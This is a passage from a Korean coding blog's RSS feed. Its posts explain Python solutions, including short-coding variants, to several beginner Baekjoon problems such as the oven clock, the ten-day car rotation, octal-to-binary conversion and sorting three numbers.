함수로 List 안에 숫자의 갯수를 확인하여 중복 갯수를 확인하였다.<br>중복 갯수가 2개인 경우, 중복된 값이 식에 들어가야함으로 별도로 어느 숫자가 중복인지 검사하여 결과를 구하였다.</p><hr><h2 id="숏코딩-문제풀이"><a href="#숏코딩-문제풀이" class="headerlink" title="숏코딩 문제풀이"></a>숏코딩 문제풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a,b,c=<span class="built_in">sorted</span>(<span class="built_in">input</span>().split())</span><br><span class="line">print([<span class="string">&#x27;1&#x27;</span>+b,c][a&lt;b&lt;c]+<span class="string">&#x27;000&#x27;</span>[a&lt;c:])</span><br></pre></td></tr></table></figure><p>한번에 보고 이해하기 힘든 코드이다.<br>Sorted 함수를 이용하여 입력받은 숫자들을 정렬하여 변수에 넣어줬다. 이러는 이유는 슬라이싱을 이용하기 위함이다.</p><p>문제의 조건은 밑과 같다<br>    - 3개 동일 -&gt; 3개 중 아무 하나<br>    - 2개 중복 -&gt; 중복된 숫자<br>    - 중복 X -&gt; 가장 큰수</p><p>즉, 중복된 숫자와 가장 큰 수를 구해야하는게 이 문제의 핵심이다.</p><p><code>[&#39;1&#39;+b, c][a&lt;b&lt;c]</code> 이 코드에서 1은 중복된 숫자가 있을 경우 더해질 10000과 1000의 1를 뜻한다.<br>이해가 안가는 사람도 있을 것이다.<br>입력된 숫자가 ‘3 2 3’이면 변수에 넣어질 때 정렬이 됨으로 a = 2,  b = 3, c = 3이 된다.<br>변수가 str 타입이므로 숫자 더하기가 아닌 문자 더하기으로 계산이 되기 때문에  <code>[&#39;1&#39;+b, c]</code>은 <code>[&#39;13&#39;, 3]</code>이 된다.<br>그 후 중복이 있는지 없는지를 확인하였다. -&gt;  <code>[a&lt;b&lt;c]</code>는 b=c 임으로 False가 나오게 된다. False은 0으로 취급할 수 있기 때문에 최종 나오는 결과는 13이 나오게 된다. 만약 중복값이 없다면 a&lt;b&lt;c가 True가 됨으로 가장 큰 수인 C가 나오게 된다.</p><p>위에 중복값이 있는지 없는지를 확인하였다. 이제 각 상황에 맞게 10000의 자리인지 1000의 자리인지 100의 자리인지를 확인해야한다.</p><p>이는 a&lt;c를 이용하여 확인하였다. </p><ul><li>3개가 중복이면 a=c가 됨으로 False가 나오고 000이 더해지게 된다.</li><li> 중복 2개 or 중복이 없으면, True가 나와서 00이 된다.</li></ul>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/">백준 브론즈4</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/backjoon/">backjoon</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/">백준 브론즈4</category>
      
      <category domain="https://lrtk-coder.github.io/tags/backjoon-bronze4/">backjoon bronze4</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-2480%EB%B2%88-%EB%AC%B8%EC%A0%9C/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>백준 브론즈4 - 10156번 문제</title>
      <link>https://lrtk-coder.github.io/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-10156%EB%B2%88-%EB%AC%B8%EC%A0%9C/</link>
      <guid>https://lrtk-coder.github.io/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-10156%EB%B2%88-%EB%AC%B8%EC%A0%9C/</guid>
      <pubDate>Fri, 22 Jan 2021 05:41:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;백준-브론즈4-10156번-문제&quot;&gt;&lt;a href=&quot;#백준-브론즈4-10156번-문제&quot; class=&quot;headerlink&quot; title=&quot;백준 브론즈4 10156번 문제&quot;&gt;&lt;/a&gt;백준 브론즈4 10156번 문제&lt;/h1&gt;&lt;p&gt;동수는 제과점에 과</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="백준-브론즈4-10156번-문제"><a href="#백준-브론즈4-10156번-문제" class="headerlink" title="백준 브론즈4 10156번 문제"></a>백준 브론즈4 10156번 문제</h1><p>동수는 제과점에 과자를 사러 가는데 현재 가진 돈이 모자랄 경우 부모님께 모자란 돈을 받으려고 한다. 과자 한 개의 가격이 K, 사려고 하는 과자의 개수가 N이고, 현재 가진 돈의 액수를 M이라 할 때 여러분은 동수가 부모님께 받아야 하는 모자란 돈을 계산하려고 한다.<br>예를 들어, 과자 한 개의 가격이 30원, 사려고 하는 과자의 개수가 4개, 현재 동수가 가진 돈이 100원이라 할 때, 동수가 부모님께 받아야 하는 돈은 20원이다. 과자 한 개의 가격이 250원, 사려고 하는 과자의 개수가 2개, 현재 동수가 가진 돈이 140원이라 할 때, 동수가 부모님께 받아야 하는 돈은 360원이다. 과자 한 개의 가격이 20원, 사려고 하는 과자의 개수가 6개, 현재 동수가 가진 돈이 120원이라 할 때 동수가 부모님께 받아야 하는 돈은 0원이다. 과자 한 개의 가격이 20원, 사려고 하는 과자의 개수가 10개, 현재 동수가 가진 돈이 320원이라 할 때 동수가 부모님께 받아야 하는 돈은 역시 0원이다.<br>과자 한 개의 가격, 사려고 하는 과자의 개수와 동수가 현재 가진 돈의 액수가 주어질 때 동수가 부모님께 받아야 하는 돈의 액수를 출력하는 프로그램을 작성하시오. </p><hr><h2 id="문제풀이"><a href="#문제풀이" class="headerlink" title="문제풀이"></a>문제풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a, b, c = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line"><span class="keyword">if</span> a*b &gt; c: print(a*b-c)</span><br><span class="line"><span class="keyword">else</span>: print(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>조건문과 사칙 연산을 이용하여 문제를 풀이하였다.</p><hr><h2 id="숏코딩-문제풀이"><a href="#숏코딩-문제풀이" class="headerlink" title="숏코딩 문제풀이"></a>숏코딩 문제풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a, b, c = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line">print(<span class="built_in">max</span>(a*b-c, <span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>Max 함수를 이용하여 조건문을 사용하지 않고 해결하였다.<br>여유 돈보다 구입액이 많으면 양수가 나와서 0보다 크므로 차액이 나온다.<br>그 반대는 음수가 나오므로 0이 큰 수가 되어 0이 나온다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/">백준 브론즈4</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/backjoon/">backjoon</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/">백준 브론즈4</category>
      
      <category domain="https://lrtk-coder.github.io/tags/backjoon-bronze4/">backjoon bronze4</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-10156%EB%B2%88-%EB%AC%B8%EC%A0%9C/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>백준 브론즈4 - 1212번 문제</title>
      <link>https://lrtk-coder.github.io/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-1212%EB%B2%88-%EB%AC%B8%EC%A0%9C/</link>
      <guid>https://lrtk-coder.github.io/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-1212%EB%B2%88-%EB%AC%B8%EC%A0%9C/</guid>
      <pubDate>Fri, 22 Jan 2021 05:40:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;백준-브론즈4-1212번-문제&quot;&gt;&lt;a href=&quot;#백준-브론즈4-1212번-문제&quot; class=&quot;headerlink&quot; title=&quot;백준 브론즈4 1212번 문제&quot;&gt;&lt;/a&gt;백준 브론즈4 1212번 문제&lt;/h1&gt;&lt;p&gt; 8진수가 주어졌을 때, </description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="백준-브론즈4-1212번-문제"><a href="#백준-브론즈4-1212번-문제" class="headerlink" title="백준 브론즈4 1212번 문제"></a>백준 브론즈4 1212번 문제</h1><p> 8진수가 주어졌을 때, 2진수로 변환하는 프로그램을 작성하시오.</p><hr><h2 id="문제풀이"><a href="#문제풀이" class="headerlink" title="문제풀이"></a>문제풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">input</span>(), <span class="number">8</span>))[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><p>int 함수의 파라미터를 8진수로 지정하여 8진수를 입력받아 bin 함수를 이용하여 2진수로 구하였다.<br>하지만, 출력하면 <code>0b11001100</code>이라는 값이 출력이 된다.<br>이를 해결하기 위해 슬라이싱을 이용하여 0b를 제거하였다.</p><h3 id="숏코딩-문제풀이"><a href="#숏코딩-문제풀이" class="headerlink" title="숏코딩 문제풀이"></a>숏코딩 문제풀이</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">int</span>(<span class="built_in">input</span>(),<span class="number">8</span>):b&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>이 코드는 bin 함수를 사용하지 않고, f-string을 이용하여 2진수를 구하였다.</p><hr><h2 id="f-string-모드"><a href="#f-string-모드" class="headerlink" title="f-string 모드"></a>f-string 모드</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">input</span>()<span class="comment"># 입력 10</span></span><br><span class="line">print(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">int</span>(a):b&#125;</span>&#x27;</span>)<span class="comment"># 출력 1010</span></span><br><span class="line">print(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">int</span>(a):o&#125;</span>&#x27;</span>)<span class="comment"># 출력 12</span></span><br><span class="line">print(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">int</span>(a):x&#125;</span>&#x27;</span>)<span class="comment"># 출력 a</span></span><br><span class="line">print(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">int</span>(a):X&#125;</span>&#x27;</span>)<span class="comment"># 출력 A</span></span><br><span class="line">print(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">int</span>(a):d&#125;</span>&#x27;</span>)<span class="comment"># 출력 10</span></span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">input</span>()<span class="comment"># 입력 10</span></span><br><span class="line">print(f&#x27;&#123;int(a):#b&#125;&#x27;)# 출력 0b1010</span><br><span class="line">print(f&#x27;&#123;int(a):#o&#125;&#x27;)# 출력 0a12</span><br><span class="line">print(f&#x27;&#123;int(a):#x&#125;&#x27;)# 출력 0xa</span><br><span class="line">print(f&#x27;&#123;int(a):#X&#125;&#x27;)# 출력 0XA</span><br><span class="line">print(f&#x27;&#123;int(a):#d&#125;&#x27;)# 출력 10</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/">백준 브론즈4</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/backjoon/">backjoon</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/">백준 브론즈4</category>
      
      <category domain="https://lrtk-coder.github.io/tags/backjoon-bronze4/">backjoon bronze4</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-1212%EB%B2%88-%EB%AC%B8%EC%A0%9C/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>백준 브론즈4 - 2525번 문제</title>
      <link>https://lrtk-coder.github.io/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-2525%EB%B2%88-%EB%AC%B8%EC%A0%9C/</link>
      <guid>https://lrtk-coder.github.io/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-2525%EB%B2%88-%EB%AC%B8%EC%A0%9C/</guid>
      <pubDate>Fri, 22 Jan 2021 05:28:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;백준-브론즈4-2525번-문제&quot;&gt;&lt;a href=&quot;#백준-브론즈4-2525번-문제&quot; class=&quot;headerlink&quot; title=&quot;백준 브론즈4 2525번 문제&quot;&gt;&lt;/a&gt;백준 브론즈4 2525번 문제&lt;/h2&gt;&lt;p&gt;KOI 전자에서는 건강에 </description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="백준-브론즈4-2525번-문제"><a href="#백준-브론즈4-2525번-문제" class="headerlink" title="백준 브론즈4 2525번 문제"></a>백준 브론즈4 2525번 문제</h2><p>KOI 전자에서는 건강에 좋고 맛있는 훈제오리구이 요리를 간편하게 만드는 인공지능 오븐을 개발하려고 한다. 인공지능 오븐을 사용하는 방법은 적당한 양의 오리 훈제 재료를 인공지능 오븐에 넣으면 된다. 그러면 인공지능 오븐은 오븐구이가 끝나는 시간을 분 단위로 자동적으로 계산한다.<br>또한, KOI 전자의 인공지능 오븐 앞면에는 사용자에게 훈제오리구이 요리가 끝나는 시각을 알려 주는 디지털 시계가 있다.<br>훈제오리구이를 시작하는 시각과 오븐구이를 하는 데 필요한 시간이 분단위로 주어졌을 때, 오븐구이가 끝나는 시각을 계산하는 프로그램을 작성하시오.<br>Link : <a href="https://www.acmicpc.net/problem/2525">2525번: 오븐 시계</a></p><h3 id="문제풀이"><a href="#문제풀이" class="headerlink" title="문제풀이"></a>문제풀이</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">a, b= <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line">c = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">d = b+c</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> d &lt; <span class="number">60</span>:</span><br><span class="line">    print(a, d)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> a &gt; <span class="number">23</span>: a = <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        d = d<span class="number">-60</span></span><br><span class="line">        <span class="keyword">if</span> d &lt; <span class="number">60</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    print(a, d)</span><br></pre></td></tr></table></figure><p>무한루프와 조건문을 써서 해결했지만, 효율성은 너무 떨어지는 문제 풀이이다.</p><p>좀 더 간단하게 수정하겠다.</p><h3 id="숏코딩-문제풀이"><a href="#숏코딩-문제풀이" class="headerlink" title="숏코딩 문제풀이"></a>숏코딩 문제풀이</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">t = <span class="built_in">eval</span>( <span class="built_in">input</span>().replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;*60+&#x27;</span>) ) + <span class="built_in">int</span>( <span class="built_in">input</span>() )</span><br><span class="line">print(t//<span class="number">60</span>%<span class="number">24</span>,t%<span class="number">60</span>)</span><br></pre></td></tr></table></figure><p>이  코드는 첫번째 입력값인 시와 분을 분 단위로 수정하여 두번째 입력값과 더한 후 시와 분으로 나누어 출력하였다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/">백준 브론즈4</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/backjoon/">backjoon</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/">백준 브론즈4</category>
      
      <category domain="https://lrtk-coder.github.io/tags/backjoon-bronze4/">backjoon bronze4</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/01/22/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-2525%EB%B2%88-%EB%AC%B8%EC%A0%9C/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>백준 브론즈4 - 2752번 문제</title>
      <link>https://lrtk-coder.github.io/2021/01/21/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-2752%EB%B2%88-%EB%AC%B8%EC%A0%9C/</link>
      <guid>https://lrtk-coder.github.io/2021/01/21/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-2752%EB%B2%88-%EB%AC%B8%EC%A0%9C/</guid>
      <pubDate>Thu, 21 Jan 2021 20:31:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;백준-브론즈4-2752번-문제&quot;&gt;&lt;a href=&quot;#백준-브론즈4-2752번-문제&quot; class=&quot;headerlink&quot; title=&quot;백준 브론즈4 2752번 문제&quot;&gt;&lt;/a&gt;백준 브론즈4 2752번 문제&lt;/h1&gt;&lt;p&gt;동규는 세수를 하다가 정렬</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="백준-브론즈4-2752번-문제"><a href="#백준-브론즈4-2752번-문제" class="headerlink" title="백준 브론즈4 2752번 문제"></a>백준 브론즈4 2752번 문제</h1><p>동규는 세수를 하다가 정렬이 하고싶어졌다.<br>숫자 세 개를 생각한 뒤에, 이를 오름차순으로 정렬하고 싶어 졌다.<br>숫자 세 개가 주어졌을 때, 가장 작은 수, 그 다음 수, 가장 큰 수를 출력하는 프로그램을 작성하시오.</p><hr><h2 id="문제풀이"><a href="#문제풀이" class="headerlink" title="문제풀이"></a>문제풀이</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line">print(*<span class="built_in">sorted</span>(a))</span><br></pre></td></tr></table></figure><p>Sorted 함수를 사용하여 정렬 후 출력하였다.<br>print 함수 안에 있는 ::*::는 ::Asterisk::를 뜻하며, 컨테이너 타입의 데이터를 Unpacking할 때 쓴인다.<br>쉽게 말해 리스트 안에 있는 모든 데이터를 밖으로 꺼내준다는 뜻으로 생각하면 된다.</p><h3 id="숏코딩-문제풀이"><a href="#숏코딩-문제풀이" class="headerlink" title="숏코딩 문제풀이"></a>숏코딩 문제풀이</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(*<span class="built_in">sorted</span>(<span class="built_in">input</span>().split(),key=<span class="built_in">int</span>))</span><br></pre></td></tr></table></figure><p>굳이 설명을 할 필요가 없을 것 같아 코드 설명은 안하겠다.</p><hr><h2 id="Sort-함수-Vs-Sorted-함수"><a href="#Sort-함수-Vs-Sorted-함수" class="headerlink" title="Sort 함수 Vs Sorted 함수"></a>Sort 함수 Vs Sorted 함수</h2><p>Sort 함수</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line">a.sort()</span><br><span class="line">print(a)<span class="comment"># 출력 [1, 2, 3]</span></span><br></pre></td></tr></table></figure><p>Sorted 함수</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line">print(<span class="built_in">sorted</span>(a))<span class="comment"># 출력 [1, 2, 3]</span></span><br><span class="line">print(a)<span class="comment"># 출력 [3, 2, 1]</span></span><br></pre></td></tr></table></figure><p>Sort 함수는 실제 리스트의 순서가 변경이 되며, Sorted 함수의 경우 실제 리스트의 순서는 변화가 없었다.</p><h3 id="성능의-비교"><a href="#성능의-비교" class="headerlink" title="성능의 비교"></a>성능의 비교</h3><p>스택오버플로우에서 찾아보니, Sort 함수가 Sorted 함수보다 약 2% 빠르다는 결과를 알려주었습니다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/">백준 브론즈4</category>
      
      
      <category domain="https://lrtk-coder.github.io/tags/backjoon/">backjoon</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/tags/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/">백준 브론즈4</category>
      
      <category domain="https://lrtk-coder.github.io/tags/backjoon-bronze4/">backjoon bronze4</category>
      
      
      <comments>https://lrtk-coder.github.io/2021/01/21/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-2752%EB%B2%88-%EB%AC%B8%EC%A0%9C/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>백준 브론즈4 - 10797번 문제</title>
      <link>https://lrtk-coder.github.io/2021/01/21/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-10797%EB%B2%88-%EB%AC%B8%EC%A0%9C/</link>
      <guid>https://lrtk-coder.github.io/2021/01/21/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884-10797%EB%B2%88-%EB%AC%B8%EC%A0%9C/</guid>
      <pubDate>Thu, 21 Jan 2021 20:09:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;백준-브론즈4-10797번-문제&quot;&gt;&lt;a href=&quot;#백준-브론즈4-10797번-문제&quot; class=&quot;headerlink&quot; title=&quot;백준 브론즈4 10797번 문제&quot;&gt;&lt;/a&gt;백준 브론즈4 10797번 문제&lt;/h2&gt;&lt;p&gt;서울시는 6월 1일</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="백준-브론즈4-10797번-문제"><a href="#백준-브론즈4-10797번-문제" class="headerlink" title="백준 브론즈4 10797번 문제"></a>백준 브론즈4 10797번 문제</h2><p>서울시는 6월 1일부터 교통 혼잡을 막기 위해서 자동차 10부제를 시행한다. 자동차 10부제는 자동차 번호의 일의 자리 숫자와 날짜의 일의 자리 숫자가 일치하면 해당 자동차의 운행을 금지하는 것이다. 예를 들어, 자동차 번호의 일의 자리 숫자가 7이면 7일, 17일, 27일에 운행하지 못한다. 또한, 자동차 번호의 일의 자리 숫자가 0이면 10일, 20일, 30일에 운행하지 못한다.<br>여러분들은 일일 경찰관이 되어 10부제를 위반하는 자동차의 대수를 세는 봉사활동을 하려고 한다. 날짜의 일의 자리 숫자가 주어지고 5대의 자동차 번호의 일의 자리 숫자가 주어졌을 때 위반하는 자동차의 대수를 출력하면 된다.<br>Link : <a href="https://www.acmicpc.net/problem/10797">10797번: 10부제</a></p><h3 id="문제-풀이"><a href="#문제-풀이" class="headerlink" title="문제 풀이"></a>문제 풀이</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">b = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">input</span>().split())</span><br><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    <span class="keyword">if</span> a == i:</span><br><span class="line">        <span class="built_in">sum</span> += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">print(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure><p>반복문과 조건문을 사용하여 문제 해결하였다.<br>이제 반복문과 조건문을 대신하여 파이썬의 내장 함수인 ::Count 함수::를 이용하여 풀이하겠다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="built_in">input</span></span><br><span class="line">k = i()</span><br><span class="line">print(i().count(k))</span><br></pre></td></tr></table></figure><p>이렇게 간단하게 구현하였다.</p><h3 id="코드-해석"><a href="#코드-해석" class="headerlink" title="코드 해석"></a>코드 해석</h3><p>변수 i를 input 함수로 지정하였다. 즉, 변수 i가 input 함수 그 자체가 된 것이다.<br>변수 k에 첫번째 입력값을 넣어주고, print 함수 안에 있는 i()가 두번째 입력값을 받아서 count 함수로 k 값이 있는지 카운트를 하였다.</p><h3 id="Count-함수"><a href="#Count-함수" class="headerlink" title="Count 함수"></a>Count 함수</h3><p>Link : <a href="https://wikidocs.net/14#x-count">02-3 리스트 자료형 - 점프 투 파이썬</a><br>점프투파이썬을 참고하면 된다.</p>]]></content:encoded>
      
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/">알고리즘</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/">백준</category>
      
      <category domain="https://lrtk-coder.github.io/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/">백준 브론즈4</category>
      
      
